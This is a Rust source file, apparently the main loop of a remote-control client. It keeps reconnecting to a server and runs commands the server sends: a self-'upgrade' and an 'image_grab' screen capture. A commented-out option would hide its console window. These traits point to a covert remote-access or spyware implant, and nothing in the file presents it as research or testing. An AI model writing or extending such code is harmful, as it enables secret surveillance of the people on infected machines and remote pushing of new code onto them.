// #![windows_subsystem = "windows"]

use std::time::Duration;
use anyhow::{anyhow, Result};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::sleep;
use bytes::{Buf, BytesMut};
use variable_len_reader::str::read_string;
use crate::links::try_select_link;

mod links;
mod upgrade;
mod image_grab;

#[tokio::main]
async fn main() {
    loop {
        if main_loop().await.is_ok() {
            break;
        }
        sleep(Duration::from_secs(10)).await;
    }
}

async fn main_loop() -> Result<()> {
    let stream = try_select_link().await?;
    if stream.is_none() {
        return Err(anyhow!("No available server link."));
    }
    let mut stream = stream.unwrap();
    loop {
        let len = stream.read_u32().await?;
        let mut request = BytesMut::with_capacity(len as usize);
        stream.read_buf(&mut request).await?;
        let mut request = request.reader();
        let mut exit = false;
        let response = match &read_string(&mut request)? as &str {
            "upgrade" => {
                let res = upgrade::upgrade(&mut request).await?;
                exit = res.1;
                res.0
            },
            "image_grab" => image_grab::image_grab(&mut request).await?,
            _ => Err(anyhow!("Unknown function."))?,
        };
        stream.write_u32(response.len() as u32).await?;
        stream.write_all(&response).await?;
        stream.flush().await?;
        if exit {
            return Ok(());
        }
    }
}
